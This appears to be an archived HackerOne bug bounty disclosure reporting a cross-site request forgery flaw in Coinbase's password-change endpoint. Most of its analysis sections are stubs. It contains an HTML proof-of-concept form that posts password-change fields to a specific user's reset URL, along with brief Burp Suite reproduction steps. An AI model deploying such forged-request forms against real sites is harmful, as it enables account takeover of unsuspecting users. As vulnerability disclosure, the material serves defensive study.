# CSRF bug on password change

## Metadata
- **Source:** HackerOne
- **Report:** 230436 | https://hackerone.com/reports/230436
- **Submitted:** 2017-05-21
- **Reporter:** dark_heaven
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** unknown
- **Vuln:** Cross-Site Request Forgery (CSRF)
- **CVEs:** None
- **Category:** web-api

## Summary
> NOTE! Thanks for submitting a report! Please replace *all* the [square] sections below with the pertinent details. Remember, researchers are more likely to earn a larger bounty by explaining how a vulnerability can be exploited to cause harm to Coinbase or its users.

**Summary:** Attacker can change password without user permission

**Description:**HI I found csrf bug on password changing sessi

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

> NOTE! Thanks for submitting a report! Please replace *all* the [square] sections below with the pertinent details. Remember, researchers are more likely to earn a larger bounty by explaining how a vulnerability can be exploited to cause harm to Coinbase or its users.

**Summary:** Attacker can change password without user permission

**Description:**HI I found csrf bug on password changing session. It can be dangerous for user. Cause attacker can change password with out user permission. CSRF POC is below :-

<html>
  <body>
    <form action="https://www.coinbase.com/users/59215b8f0ec7c37a4ca27b00/password_reset" method="POST">
      <input type="hidden" name="utf8" value="â&#156;&#147;" />
      <input type="hidden" name="&#95;method" value="patch" />
      <input type="hidden" name="old&#95;password" value="dadaboji1" />
      <input type="hidden" name="password" value="dadaboji" />
      <input type="hidden" name="password&#95;confirmation" value="dadaboji" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

## Browsers Verified In:

  * [firefox 45.9.0]
  * [add each browser and version number tested in]

## Steps To Reproduce:

(Add details for how we can reproduce the issue)

  1. [Intercept with burpsuite. After change password click]
  1. [Make CSRF POC with burpsuite]
  1. [change data]

## Supporting Material/References:

  * List any additional material (e.g. screenshots, logs, etc.)

</details>

---
*Analysed by Claude on 2026-05-24*
